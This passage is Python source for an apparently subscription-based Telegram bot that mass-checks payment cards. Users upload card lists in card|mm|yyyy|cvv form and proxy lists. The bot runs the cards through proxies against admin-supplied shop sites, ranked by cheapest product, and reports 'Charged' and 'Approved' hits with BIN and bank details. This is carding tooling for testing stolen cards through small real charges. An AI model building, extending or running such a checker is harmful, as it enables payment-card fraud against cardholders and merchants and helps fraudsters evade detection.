├ <code>/addproxies</code> - Upload .txt file with proxies
├ <code>/chkproxy proxy</code> - Check single proxy
├ <code>/rmproxy proxy</code> - Remove single proxy
├ <code>/clearproxy</code> - Remove all proxies
├ <code>/getproxy</code> - Get all proxies

<b>💳 CARD CHECKING</b>
├ <code>/cc card|mm|yy|cvv</code> - Check single card
├ <code>/chk</code> - Mass check (reply to .txt file)
└ <code>/mcancel</code> - Cancel mass check

<b>⭐ SUBSCRIPTION</b>
├ <code>/subscribe</code> - Buy subscription with stars
└ <code>/redeem code</code> - Redeem activation code

<b>📝 FORMATS</b>
├ CC: <code>card|mm|yyyy|cvv</code>
└ Proxy: <code>ip:port</code> or <code>ip:port:user:pass</code>"""
        if is_admin(user_id):
            commands_text += """

<b>👑 ADMIN COMMANDS</b>
├ <code>/admin</code> - Admin panel
├ <code>/site domain</code> - Add site
├ <code>/rmsite url</code> - Remove site
├ <code>/sitecheck</code> - Check all sites
├ <code>/addsites</code> - Upload sites file
├ <code>/clearsites</code> - Clear all sites
├ <code>/mysites</code> - View all sites
├ <code>/gencode number</code> - Generate code
├ <code>/block user_id</code> - Block user
├ <code>/unblock user_id</code> - Unblock user
├ <code>/broadcast message</code> - Broadcast message
├ <code>/setlimit user_id number</code> - Set user limit
├ <code>/users</code> - List all users
├ <code>/user user_id</code> - User details
└ <code>/stats</code> - Bot statistics"""
        await event.edit(premium_emoji(commands_text), buttons=get_commands_keyboard(), parse_mode='html')
        await event.answer()
    
    elif data == "main_menu":
        stats_text = await get_user_stats_text(user_id, username)
        await event.edit(premium_emoji(stats_text), buttons=get_main_menu_keyboard(), parse_mode='html')
        await event.answer()
    
    elif data == "admin_sites" and is_admin(user_id):
        await event.edit(premium_emoji("🌐 <b>Site Management</b>\n\nChoose an option:"), buttons=get_admin_sites_menu(), parse_mode='html')
        await event.answer()
    
    elif data == "admin_panel" and is_admin(user_id):
        stats_text = """<b>👑 Admin Control Panel</b>

Use buttons below or direct commands:

├ <code>/gencode number</code> - Generate activation code
├ <code>/block user_id</code> - Block user
├ <code>/unblock user_id</code> - Unblock user
├ <code>/broadcast message</code> - Broadcast message
├ <code>/setlimit user_id number</code> - Set user limit
├ <code>/users</code> - List all users
├ <code>/user user_id</code> - Show user details
└ <code>/stats</code> - Bot statistics"""
        await event.edit(premium_emoji(stats_text), buttons=get_admin_menu_keyboard(), parse_mode='html')
        await event.answer()
    
    elif data == "admin_view_sites" and is_admin(user_id):
        sites = load_admin_sites()
        if not sites:
            await event.edit(premium_emoji("📋 <b>No sites found.</b>\n\nUse /addsites or /site to add sites."), parse_mode='html')
        else:
            sites_text = "\n".join([f"• {site}" for site in sites])
            await event.edit(premium_emoji(f"📋 <b>Sites ({len(sites)}):</b>\n\n{sites_text}"), parse_mode='html')
        await event.answer()
    
    elif data == "admin_add_site" and is_admin(user_id):
        await event.edit(premium_emoji("➕ <b>Add a site</b>\n\nSend the site domain.\nExample: <code>example.com</code>"), parse_mode='html')
        await event.answer()
    
    elif data == "admin_remove_site" and is_admin(user_id):
        sites = load_admin_sites()
        if not sites:
            await event.edit(premium_emoji("📋 <b>No sites to remove.</b>"), parse_mode='html')
        else:
            sites_text = "\n".join([f"{i+1}. {site}" for i, site in enumerate(sites)])
            await event.edit(premium_emoji(f"🗑️ <b>Remove a site</b>\n\nSend the site domain or number.\n\nCurrent sites:\n{sites_text}"), parse_mode='html')
        await event.answer()
    
    elif data == "admin_check_sites" and is_admin(user_id):
        await event.edit(premium_emoji("💰 <b>Select price range to filter sites:</b>\n\nSites will be filtered by their cheapest product price."), buttons=get_price_filter_keyboard(), parse_mode='html')
        await event.answer()
    
    elif data == "admin_upload_sites" and is_admin(user_id):
        await event.edit(premium_emoji("📁 <b>Upload sites file</b>\n\nSend a .txt file containing sites (one per line).\n\nYou will be asked to select a price filter after uploading."), parse_mode='html')
        await event.answer()
    
    elif data == "admin_clear_sites" and is_admin(user_id):
        save_admin_sites([])
        await event.edit(premium_emoji("✅ <b>All sites have been cleared!</b>"), parse_mode='html')
        await event.answer()

@bot.on(events.NewMessage(pattern='/help'))
async def help_command(event):
    user_id = event.sender_id
    if is_user_blocked(user_id) and not is_admin(user_id):
        await event.reply(premium_emoji("🚫 <b>You have been banned from this bot.</b>"), parse_mode='html')
        return
    
    help_text = """<b>📋 User Commands:</b>

├ <code>/start</code> - Show main menu
├ <code>/help</code> - Show this help
├ <code>/profile</code> - View your profile
├ <code>/myproxy</code> - View your proxies

<b>🔌 Proxy Management:</b>
├ <code>/proxy</code> - Check all proxies & remove dead
├ <code>/addproxy</code> - Add proxies (one per line)
├ <code>/addproxies</code> - Upload .txt file with proxies
├ <code>/chkproxy proxy</code> - Check single proxy
├ <code>/rmproxy proxy</code> - Remove single proxy
├ <code>/clearproxy</code> - Remove all proxies
└ <code>/getproxy</code> - Get all proxies

<b>💳 Card Checking:</b>
├ <code>/cc cc|mm|yy|cvv</code> - Check single card
├ <code>/chk</code> - Mass check (reply to .txt file)
└ <code>/mcancel</code> - Cancel mass check

<b>⭐ Subscription:</b>
├ <code>/subscribe</code> - Buy subscription with stars
└ <code>/redeem CODE</code> - Redeem activation code

<b>📝 Formats:</b>
├ CC: <code>card|mm|yyyy|cvv</code>
└ Proxy: <code>ip:port</code> or <code>ip:port:user:pass</code>"""

    if is_admin(user_id):
        help_text += """

<b>👑 Admin Commands:</b>
├ <code>/admin</code> - Admin panel
├ <code>/site domain</code> - Add site
├ <code>/rmsite url</code> - Remove site
├ <code>/sitecheck</code> - Check all sites
├ <code>/addsites</code> - Upload sites file
├ <code>/clearsites</code> - Clear all sites
├ <code>/mysites</code> - View all sites
├ <code>/gencode number</code> - Generate activation code
├ <code>/block user_id</code> - Block user
├ <code>/unblock user_id</code> - Unblock user
├ <code>/broadcast message</code> - Broadcast to all users
├ <code>/setlimit user_id number</code> - Set user check limit
├ <code>/users</code> - List all users
├ <code>/user user_id</code> - Show user details
└ <code>/stats</code> - Bot statistics"""
    
    await event.reply(premium_emoji(help_text), buttons=get_commands_keyboard(), parse_mode='html')

@bot.on(events.NewMessage(pattern='/profile'))
async def profile_command(event):
    user_id = event.sender_id
    if is_user_blocked(user_id) and not is_admin(user_id):
        await event.reply(premium_emoji("🚫 <b>You have been banned from this bot.</b>"), parse_mode='html')
        return
    
    users = load_users()
    user_data = users.get(str(user_id), {})
    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else f"user_{user_id}"
        first_name = sender.first_name if sender.first_name else "User"
    except:
        username = f"user_{user_id}"
        first_name = "User"
    total_checks = user_data.get('total_checks', 0)
    successful_checks = user_data.get('successful_checks', 0)
    registered_at = user_data.get('registered_at', datetime.now().isoformat())[:10]
    checks_left = get_user_checks_left(user_id)
    is_premium_user = user_data.get('premium', False) or is_admin(user_id)
    check_limit = user_data.get('check_limit', 0) if not is_admin(user_id) else "UNLIMITED"
    proxies_count = len(load_user_proxies(user_id))
    is_active, expiry = get_user_subscription(user_id)
    
    if is_active:
        remaining = int(expiry - time.time())
        hours = remaining // 3600
        minutes = (remaining % 3600) // 60
        subscription_status = f"✅ Active ({hours}h {minutes}m left)"
    else:
        subscription_status = "❌ No active subscription"
    
    text = f"""<b>👤 Profile</b>

├ 🆔 User ID: <code>{user_id}</code>
├ 👤 Name: {first_name}
├ 📝 Username: @{username}
├ 📊 Total Checks: {total_checks}
├ 💎 Successful Hits: {successful_checks}
├ 🔌 Proxies Added: {proxies_count}
├ ⭐ Status: {'👑 ADMIN' if is_admin(user_id) else '✅ PREMIUM' if is_premium_user else '❌ FREE'}
├ 📈 Check Limit: {check_limit}
├ 💳 Checks Left: {checks_left if not is_admin(user_id) else '♾️'}
├ 📅 Registered: {registered_at}
└ ⭐ Subscription: {subscription_status}"""
    await event.reply(premium_emoji(text), buttons=get_commands_keyboard(), parse_mode='html')

@bot.on(events.NewMessage(pattern='/myproxy'))
async def myproxy_command(event):
    user_id = event.sender_id
    if is_user_blocked(user_id) and not is_admin(user_id):
        await event.reply(premium_emoji("🚫 <b>You have been banned from this bot.</b>"), parse_mode='html')
        return
    
    proxies = load_user_proxies(user_id)
    if not proxies:
        await event.reply(premium_emoji("❌ No proxies found. Use /addproxy to add."), parse_mode='html')
        return
    if len(proxies) <= 50:
        proxy_list = "\n".join([f"{i+1}. <code>{p}</code>" for i, p in enumerate(proxies)])
        await event.reply(premium_emoji(f"<b>📋 Your proxies ({len(proxies)}):</b>\n\n{proxy_list}"), parse_mode='html')
    else:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"proxies_{user_id}_{timestamp}.txt"
        async with aiofiles.open(filename, 'w') as f:
            for i, proxy in enumerate(proxies):
                await f.write(f"{i+1}. {proxy}\n")
        await event.reply(premium_emoji(f"<b>📋 Your proxies ({len(proxies)}):</b>\n\nFile attached below."), file=filename, parse_mode='html')
        try:
            os.remove(filename)
        except:
            pass

@bot.on(events.NewMessage(pattern='/addproxy'))
async def add_proxy_command(event):
    user_id = event.sender_id
    if is_user_blocked(user_id) and not is_admin(user_id):
        await event.reply(premium_emoji("🚫 <b>You have been banned from this bot.</b>"), parse_mode='html')
        return
    try:
        args = event.message.text.split('\n')
        if len(args) < 2:
            await event.reply(premium_emoji("❌ Usage: <code>/addproxy</code> then proxies one per line."), parse_mode='html')
            return
        proxies_to_add = [line.strip() for line in args[1:] if line.strip()]
        if not proxies_to_add:
            await event.reply(premium_emoji("❌ No proxies provided."), parse_mode='html')
            return
        
        current_proxies = load_user_proxies(user_id)
        if len(current_proxies) + len(proxies_to_add) > MAX_USER_PROXIES:
            remaining = MAX_USER_PROXIES - len(current_proxies)
            await event.reply(premium_emoji(f"⚠️ <b>Proxy limit reached!</b>\n\nYou can only have {MAX_USER_PROXIES} proxies maximum.\nYou have {len(current_proxies)} proxies.\nYou can add {remaining} more proxies."), parse_mode='html')
            return
        
        new_proxies = []
        for proxy in proxies_to_add:
            if proxy not in current_proxies:
                new_proxies.append(proxy)
        
        if not new_proxies:
            await event.reply(premium_emoji("⚠️ All proxies already exist."), parse_mode='html')
            return
        
        async with aiofiles.open(get_user_proxy_file(user_id), 'a') as f:
            for proxy in new_proxies:
                await f.write(f"{proxy}\n")
        
        await event.reply(premium_emoji(f"✅ <b>Proxies Added!</b>\n\nAdded {len(new_proxies)} new proxies.\nTotal proxies: {len(current_proxies) + len(new_proxies)}/{MAX_USER_PROXIES}"), parse_mode='html')
    except Exception as e:
        await event.reply(premium_emoji(f"❌ Error: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/addproxies'))
async def add_proxies_file_command(event):
    user_id = event.sender_id
    if is_user_blocked(user_id) and not is_admin(user_id):
        await event.reply(premium_emoji("🚫 <b>You have been banned from this bot.</b>"), parse_mode='html')
        return
    if not event.reply_to_msg_id:
        await event.reply(premium_emoji("❌ Reply to a .txt file containing proxies."), parse_mode='html')
        return
    reply_msg = await event.get_reply_message()
    if not reply_msg.file or not reply_msg.file.name.endswith('.txt'):
        await event.reply(premium_emoji("❌ Reply to a .txt file."), parse_mode='html')
        return
    
    status_msg = await event.reply(premium_emoji("🔄 Processing your file..."), parse_mode='html')
    file_path = await reply_msg.download_media()
    
    async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
        content = await f.read()
    
    proxies = [line.strip() for line in content.split('\n') if line.strip()]
    
    if not proxies:
        await status_msg.edit(premium_emoji("❌ No valid proxies found in file."), parse_mode='html')
        os.remove(file_path)
        return
    
    os.remove(file_path)
    current_proxies = load_user_proxies(user_id)
    
    new_proxies = [p for p in proxies if p not in current_proxies]
    
    if new_proxies:
        async with aiofiles.open(get_user_proxy_file(user_id), 'a') as f:
            for proxy in new_proxies:
                await f.write(f"{proxy}\n")
    
    await status_msg.edit(premium_emoji(f"✅ <b>Proxies Added!</b>\n\nAdded {len(new_proxies)} new proxies.\nTotal proxies: {len(current_proxies) + len(new_proxies)}"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/chkproxy'))
async def check_single_proxy_command(event):
    user_id = event.sender_id
    if is_user_blocked(user_id) and not is_admin(user_id):
        await event.reply(premium_emoji("🚫 <b>You have been banned from this bot.</b>"), parse_mode='html')
        return
    proxy = event.message.text.split(' ', 1)[1].strip() if len(event.message.text.split()) > 1 else None
    if not proxy:
        await event.reply(premium_emoji("❌ Usage: <code>/chkproxy ip:port:user:pass</code>"), parse_mode='html')
        return
    status_msg = await event.reply(premium_emoji(f"🔄 Checking proxy: <code>{proxy}</code>..."), parse_mode='html')
    try:
        result = await test_proxy_with_retry(proxy)
        if result['status'] == 'alive':
            await status_msg.edit(premium_emoji(f"✅ <b>Proxy is ALIVE!</b>\n\n<code>{proxy}</code>\nReason: {result['reason']}"), parse_mode='html')
        else:
            await status_msg.edit(premium_emoji(f"❌ <b>Proxy is DEAD!</b>\n\n<code>{proxy}</code>\nReason: {result['reason']}"), parse_mode='html')
    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Error: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/rmproxy'))
async def remove_single_proxy_command(event):
    user_id = event.sender_id
    if is_user_blocked(user_id) and not is_admin(user_id):
        await event.reply(premium_emoji("🚫 <b>You have been banned from this bot.</b>"), parse_mode='html')
        return
    proxy_to_remove = event.message.text.split(' ', 1)[1].strip() if len(event.message.text.split()) > 1 else None
    if not proxy_to_remove:
        await event.reply(premium_emoji("❌ Usage: <code>/rmproxy ip:port:user:pass</code>"), parse_mode='html')
        return
    current_proxies = load_user_proxies(user_id)
    if proxy_to_remove not in current_proxies:
        await event.reply(premium_emoji(f"❌ Proxy not found: <code>{proxy_to_remove}</code>"), parse_mode='html')
        return
    new_proxies = [p for p in current_proxies if p != proxy_to_remove]
    save_user_proxies(user_id, new_proxies)
    await event.reply(premium_emoji(f"✅ <b>Proxy Removed!</b>\n\n<code>{proxy_to_remove}</code>"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/clearproxy'))
async def clear_proxies_command(event):
    user_id = event.sender_id
    if is_user_blocked(user_id) and not is_admin(user_id):
        await event.reply(premium_emoji("🚫 <b>You have been banned from this bot.</b>"), parse_mode='html')
        return
    current_proxies = load_user_proxies(user_id)
    count = len(current_proxies)
    if count == 0:
        await event.reply(premium_emoji("❌ No proxies to clear."), parse_mode='html')
        return
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    backup_filename = f"proxy_backup_{user_id}_{timestamp}.txt"
    try:
        async with aiofiles.open(backup_filename, 'w') as f:
            for proxy in current_proxies:
                await f.write(f"{proxy}\n")
        await event.reply(premium_emoji(f"📦 <b>Backup Created!</b>\n\nBackup of {count} proxies attached."), file=backup_filename, parse_mode='html')
        try:
            os.remove(backup_filename)
        except:
            pass
    except Exception as e:
        await event.reply(premium_emoji(f"❌ Error creating backup: {e}"), parse_mode='html')
        return
    save_user_proxies(user_id, [])
    await event.reply(premium_emoji(f"✅ <b>Cleared all {count} proxies!</b>"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/proxy'))
async def proxy_check_command(event):
    user_id = event.sender_id
    if is_user_blocked(user_id) and not is_admin(user_id):
        await event.reply(premium_emoji("🚫 <b>You have been banned from this bot.</b>"), parse_mode='html')
        return
    
    proxies = load_user_proxies(user_id)
    if not proxies:
        await event.reply(premium_emoji("❌ No proxies to check."), parse_mode='html')
        return
    
    status_msg = await event.reply(premium_emoji(f"🔥 Checking {len(proxies)} proxies directly..."), parse_mode='html')
    
    results = await test_proxy_batch(proxies)
    
    alive_proxies = [r['proxy'] for r in results if r['status'] == 'alive']
    dead_proxies = [r['proxy'] for r in results if r['status'] == 'dead']
    
    dead_reasons = []
    for r in results:
        if r['status'] == 'dead':
            short_proxy = r['proxy'][:30] + "..." if len(r['proxy']) > 30 else r['proxy']
            dead_reasons.append(f"• {short_proxy} -> {r['reason']}")
    
    reasons_text = "\n".join(dead_reasons[:10]) if dead_reasons else "None"
    if len(dead_reasons) > 10:
        reasons_text += f"\n... and {len(dead_reasons) - 10} more"
    
    await status_msg.edit(
        premium_emoji(
            f"🔥 Checking proxies...\n\n"
            f"<b>Checked:</b> {len(alive_proxies) + len(dead_proxies)}/{len(proxies)}\n"
            f"<b>Alive:</b> {len(alive_proxies)}\n"
            f"<b>Dead:</b> {len(dead_proxies)}\n\n"
            f"<b>Recent failures:</b>\n<code>{reasons_text}</code>"
        ),
        parse_mode='html'
    )
    
    save_user_proxies(user_id, alive_proxies)
    
    summary = f"""✅ <b>Proxy Check Complete!</b>

<b>Total Proxies:</b> {len(proxies)}
<b>Alive:</b> {len(alive_proxies)}
<b>Removed:</b> {len(dead_proxies)}

Your proxies have been updated with only working proxies."""
    
    await status_msg.edit(premium_emoji(summary), parse_mode='html')

@bot.on(events.NewMessage(pattern='/getproxy'))
async def get_proxies_command(event):
    user_id = event.sender_id
    if is_user_blocked(user_id) and not is_admin(user_id):
        await event.reply(premium_emoji("🚫 <b>You have been banned from this bot.</b>"), parse_mode='html')
        return
    proxies = load_user_proxies(user_id)
    if not proxies:
        await event.reply(premium_emoji("❌ No proxies in proxy.txt"), parse_mode='html')
        return
    if len(proxies) <= 50:
        proxy_list = "\n".join([f"{i+1}. <code>{p}</code>" for i, p in enumerate(proxies)])
        await event.reply(premium_emoji(f"<b>📋 All Proxies ({len(proxies)}):</b>\n\n{proxy_list}"), parse_mode='html')
    else:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"proxies_{user_id}_{timestamp}.txt"
        async with aiofiles.open(filename, 'w') as f:
            for i, proxy in enumerate(proxies):
                await f.write(f"{i+1}. {proxy}\n")
        await event.reply(premium_emoji(f"<b>📋 All Proxies ({len(proxies)}):</b>\n\nFile attached below."), file=filename, parse_mode='html')
        try:
            os.remove(filename)
        except:
            pass

@bot.on(events.NewMessage(pattern='/mcancel'))
async def cancel_check_command(event):
    user_id = event.sender_id
    canceled = False
    for session_key in list(active_sessions.keys()):
        if session_key.startswith(f"{user_id}_"):
            del active_sessions[session_key]
            canceled = True
    if user_id in user_current_check:
        del user_current_check[user_id]
        canceled = True
    if user_id in user_chk_mode:
        del user_chk_mode[user_id]
        canceled = True
    if user_id in user_pending_mass:
        try:
            os.remove(user_pending_mass[user_id]['file_path'])
        except:
            pass
        del user_pending_mass[user_id]
        canceled = True
    if canceled:
        await event.reply(premium_emoji("✅ <b>Mass check cancelled!</b>"), parse_mode='html')
    else:
        await event.reply(premium_emoji("❌ No mass check in progress"), parse_mode='html')

# ==================== فحص كارت واحد (سينجل) ====================

@bot.on(events.NewMessage(pattern=r'^/cc\s+'))
async def single_cc_check(event):
    user_id = event.sender_id
    
    if is_user_blocked(user_id) and not is_admin(user_id):
        await event.reply(premium_emoji("🚫 <b>You have been banned from this bot.</b>"), parse_mode='html')
        return
    
    if user_id in user_current_check and user_current_check[user_id]:
        await event.reply(premium_emoji("⏳ <b>You already have a check in progress. Wait until it completes.</b>"), parse_mode='html')
        return
    
    sites = load_admin_sites()
    proxies = load_user_proxies(user_id)
    
    if not sites:
        await event.reply(premium_emoji("❌ No sites available. Contact admin to add sites."), parse_mode='html')
        return
    if not proxies:
        await event.reply(premium_emoji("❌ No proxies available. Add proxies using /addproxy or /addproxies"), parse_mode='html')
        return
    
    parts = event.message.text.split(maxsplit=1)
    if len(parts) < 2:
        await event.reply(premium_emoji("❌ Invalid format. Use: `/cc 4242424242424242|12|25|123`"), parse_mode='html')
        return
    
    cc_input = parts[1].strip()
    cards = extract_cc(cc_input)
    
    if not cards:
        await event.reply(premium_emoji("❌ Invalid CC format. Use: <code>/cc card|mm|yy|cvv</code>"), parse_mode='html')
        return
    
    card = cards[0]
    user_current_check[user_id] = True
    
    status_msg = await event.reply(
        premium_emoji(f"<b>⚡ 𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠...</b>\n\n<blockquote>💳 Card: <code>{card}</code></blockquote>\n"),
        parse_mode='html'
    )
    
    try:
        result = await check_card_with_retry(card, sites, proxies, max_retries=3)
        
        if not is_admin(user_id):
            increment_user_checks(user_id, 1)
        
        brand, bin_type, level, bank, country, flag = await get_bin_info(card.split('|')[0])
        
        if result['status'] == 'Charged':
            status_emoji = "💎"
            status_text = "𝐂𝐇𝐀𝐑𝐆𝐄𝐃"
            await send_hit_message(user_id, result, 'Charged')
        elif result['status'] == 'Approved':
            status_emoji = "✅"
            status_text = "𝐀𝐏𝐏𝐑𝐎𝐕𝐄𝐃"
            await send_hit_message(user_id, result, 'Approved')
        else:
            status_emoji = "❌"
            status_text = "𝐃𝐄𝐂𝐋𝐈𝐍𝐄𝐃"
        
        checks_left_display = get_user_checks_left(user_id) if not is_admin(user_id) else "♾️"
        
        final_resp = f"""<b>━━━━━━━━━━━━━━━━━</b>
<b>💠 𝐑𝐞𝐬𝐮𝐥𝐭𝐬</b>
<blockquote>{status_emoji} Status: {status_text}</blockquote>
<blockquote>💳 Card: <code>{result['card']}</code></blockquote>
<blockquote>📝 Response: {result['message'][:150]}</blockquote>
<blockquote>🌐 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 🔥 {result.get('gateway', 'Unknown')} | 💰 {result.get('price', '-')}</blockquote>
<b>💠 𝐁𝐈𝐍 𝐈𝐧𝐟𝐨</b>
<pre>𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {brand} - {bin_type} - {level}
𝗕𝗮𝗻𝗸: {bank}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country} {flag}</pre>
<b>💳 Checks left: {checks_left_display}</b>"""
        
        await status_msg.edit(premium_emoji(final_resp), parse_mode='html')
        await asyncio.sleep(5)
        
    except Exception as e:
        print(f"[ERROR] Exception in single_cc_check: {e}")
        await status_msg.edit(premium_emoji(f"❌ Error checking card: {e}"), parse_mode='html')
    finally:
        user_current_check[user_id] = False

# ==================== فحص جماعي (كومبو) ====================

@bot.on(events.NewMessage(pattern='/chk'))
async def mass_check_command(event):
    user_id = event.sender_id
    
    if is_user_blocked(user_id) and not is_admin(user_id):
        await event.reply(premium_emoji("🚫 <b>You have been banned from this bot.</b>"), parse_mode='html')
        return
    
    if user_id in user_current_check and user_current_check[user_id]:
        await event.reply(premium_emoji("⏳ <b>You already have a check in progress. Wait until it completes.</b>"), parse_mode='html')
        return
    
    if not event.reply_to_msg_id:
        await event.reply(premium_emoji("❌ Reply to a .txt file containing cards."), parse_mode='html')
        return
    
    reply_msg = await event.get_reply_message()
    if not reply_msg.file or not reply_msg.file.name.endswith('.txt'):
        await event.reply(premium_emoji("❌ Reply to a .txt file."), parse_mode='html')
        return
    
    sites = load_admin_sites()
    proxies = load_user_proxies(user_id)
    
    if not sites:
        await event.reply(premium_emoji("❌ No sites available. Contact admin to add sites."), parse_mode='html')
        return
    if not proxies:
        await event.reply(premium_emoji("❌ No proxies available. Add proxies first."), parse_mode='html')
        return
    
    await cleanup_expired_pending()
    
    if user_id in user_pending_mass:
        try:
            os.remove(user_pending_mass[user_id]['file_path'])
        except:
            pass
        del user_pending_mass[user_id]
    
    file_path = await reply_msg.download_media()
    
    user_pending_mass[user_id] = {
        'file_path': file_path,
        'expires': time.time() + PENDING_TIMEOUT
    }
    
    mode_keyboard = [
        [Button.inline("💎 CHARGES ONLY", b"mode_charges")],
        [Button.inline("💎 + ✅ ALL HITS", b"mode_all")],
        [Button.inline("❌ Cancel", b"mode_cancel")]
    ]
    
    await event.reply(
        premium_emoji(f"📋 <b>Select mode:</b>\n\n• CHARGES ONLY: Only send charged cards\n• ALL HITS: Send charged + approved cards\n\nYou have {PENDING_TIMEOUT//60} minutes to select."),
        buttons=mode_keyboard,
        parse_mode='html'
    )

@bot.on(events.CallbackQuery(pattern=b"mode_charges|mode_all|mode_cancel"))
async def handle_mode_selection(event):
    user_id = event.sender_id
    data = event.data.decode('utf-8')
    
    await cleanup_expired_pending()
    
    if user_id not in user_pending_mass:
        await event.answer("⚠️ Session expired or no pending file.\nPlease use /chk again.", alert=True)
        await event.edit(premium_emoji("❌ <b>Session Expired!</b>\n\nYou took too long to select. Please use /chk again."), parse_mode='html')
        return
    
    if data == "mode_cancel":
        pending = user_pending_mass.pop(user_id)
        try:
            os.remove(pending['file_path'])
        except:
            pass
        await event.edit(premium_emoji("❌ Mass check cancelled."), parse_mode='html')
        await event.answer()
        return
    
    mode = "charges_only" if data == "mode_charges" else "all_hits"
    user_chk_mode[user_id] = mode
    
    pending = user_pending_mass.pop(user_id)
    file_path = pending['file_path']
    
    async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
        content = await f.read()
    
    cards = extract_cc(content)
    
    if not cards:
        await event.edit(premium_emoji("❌ No valid cards found in file."), parse_mode='html')
        try:
            os.remove(file_path)
        except:
            pass
        return
    
    try:
        os.remove(file_path)
    except:
        pass
    
    sites = load_admin_sites()
    proxies = load_user_proxies(user_id)
    
    if not is_admin(user_id):
        checks_left = get_user_checks_left(user_id)
        if len(cards) > checks_left:
            await event.edit(premium_emoji(f"⚠️ File contains {len(cards)} cards but you have {checks_left} checks left.\n\nChecking first {checks_left} cards."), parse_mode='html')
            cards = cards[:checks_left]
    
    max_cards = 10000 if is_admin(user_id) else 5000
    if len(cards) > max_cards:
        await event.edit(premium_emoji(f"⚠️ File contains {len(cards)} cards. Limiting to first {max_cards} cards."), parse_mode='html')
        cards = cards[:max_cards]
    
    total_cards = len(cards)
    status_msg = await event.edit(premium_emoji(f"🔄 Starting check for {total_cards} cards..."), parse_mode='html')
    
    user_current_check[user_id] = True
    
    session_key = f"{user_id}_{status_msg.id}"
    active_sessions[session_key] = {'paused': False}
    
    all_results = {
        'charged': [],
        'approved': [],
        'dead': [],
        'total': total_cards,
        'checked': 0,
        'start_time': time.time()
    }
    
    card_responses = []
    
    try:
        queue = asyncio.Queue()
        for card in cards:
            queue.put_nowait(card)
            
        last_update_time = [time.time()]
        
        async def worker():
            while not queue.empty() and session_key in active_sessions:
                session_state = active_sessions.get(session_key)
                if not session_state:
                    break
                while session_state.get('paused', False):
                    await asyncio.sleep(1)
                    session_state = active_sessions.get(session_key)
                    if not session_state:
                        return
                        
                try:
                    card = queue.get_nowait()
                except asyncio.QueueEmpty:
                    break
                    
                current_sites = load_admin_sites()
                current_proxies = load_user_proxies(user_id)
                if not current_sites or not current_proxies:
                    break
                
                res = await check_card_with_retry(card, current_sites, current_proxies, max_retries=1)
                
                all_results['checked'] += 1
                
                if not is_admin(user_id):
                    increment_user_checks(user_id, 1)
                
                card_responses.append({
                    'card': card,
                    'status': res['status'],
                    'message': res['message'],
                    'price': res.get('price', '-'),
                    'gateway': res.get('gateway', 'Unknown')
                })
                
                if res['status'] == 'Charged':
                    all_results['charged'].append(res)
                    await send_hit_message(user_id, res, 'Charged')
                elif res['status'] == 'Approved' and mode == "all_hits":
                    all_results['approved'].append(res)
                    await send_hit_message(user_id, res, 'Approved')
                elif res['status'] == 'Approved':
                    all_results['approved'].append(res)
                else:
                    all_results['dead'].append(res)
                    
                queue.task_done()
                
                now = time.time()
                if now - last_update_time[0] >= 1.0:
                    last_update_time[0] = now
                    if session_key in active_sessions:
                        try:
                            elapsed = int(time.time() - all_results['start_time'])
                            hours = elapsed // 3600
                            minutes = (elapsed % 3600) // 60
                            seconds = elapsed % 60
                            
                            gateway = all_results['charged'][0]['gateway'] if all_results['charged'] else (all_results['approved'][0]['gateway'] if all_results['approved'] else 'Unknown')
                            
                            recent_responses = ""
                            for cr in card_responses[-5:]:
                                if cr['status'] == 'Charged':
                                    emoji = "💎"
                                elif cr['status'] == 'Approved':
                                    emoji = "✅"
                                else:
                                    emoji = "❌"
                                short_card = cr['card'][:10] + "***" + cr['card'][-4:] if len(cr['card']) > 15 else cr['card']
                                recent_responses += f"{emoji} {short_card} | {cr['message'][:40]}\n"
                            
                            progress_text = f"""
<b>💠 𝐏𝐫𝐨𝐠𝐫𝐞𝐬𝐬</b>
<blockquote>💳 Total: {all_results['total']} | 💎 Charged: {len(all_results['charged'])} | ✅ Approved: {len(all_results['approved'])} | ❌ Dead: {len(all_results['dead'])}</blockquote>
<blockquote>📊 Checked: {all_results['checked']}/{all_results['total']}</blockquote>
<blockquote>🌐 Gateway: 🔥 {gateway}</blockquote>
<blockquote>⏱️ Time: {hours}h {minutes}m {seconds}s</blockquote>
<b>━━━━━━━━━━━━━━━━━</b>
<b>📝 Recent Results:</b>
<code>{recent_responses}</code>
<b>━━━━━━━━━━━━━━━━━</b>
"""
                            await bot.edit_message(user_id, status_msg.id, premium_emoji(progress_text), buttons=[
                                [Button.inline("⏸️ Pause", b"pause"), Button.inline("▶️ Resume", b"resume")],
                                [Button.inline("🛑 Stop", b"stop")]
                            ], parse_mode='html')
                        except Exception as e:
                            print(f"Error updating progress: {e}")
        
        workers = [asyncio.create_task(worker()) for _ in range(10)]
        
        while workers:
            if session_key not in active_sessions:
                for w in workers:
                    if not w.done():
                        w.cancel()
                break
            done, pending = await asyncio.wait(workers, timeout=1.0)
            workers = list(pending)
        
        if session_key in active_sessions:
            elapsed = int(time.time() - all_results['start_time'])
            hours = elapsed // 3600
            minutes = (elapsed % 3600) // 60
            seconds = elapsed % 60
            
            hits_text = ""
            if all_results['charged']:
                for r in all_results['charged'][:10]:
                    hits_text += f"💎 <code>{r['card']}</code> | {r.get('price', '-')}\n"
            if all_results['approved'] and mode == "all_hits":
                for r in all_results['approved'][:10]:
                    hits_text += f"✅ <code>{r['card']}</code> | {r.get('price', '-')}\n"
            
            if not hits_text:
                hits_text = "No hits found"
            
            gateway = all_results['charged'][0]['gateway'] if all_results['charged'] else (all_results['approved'][0]['gateway'] if all_results['approved'] else 'Unknown')
            
            checks_left_display = get_user_checks_left(user_id) if not is_admin(user_id) else "♾️"
            
            summary = f"""<b>━━━━━━━━━━━━━━━━━</b>
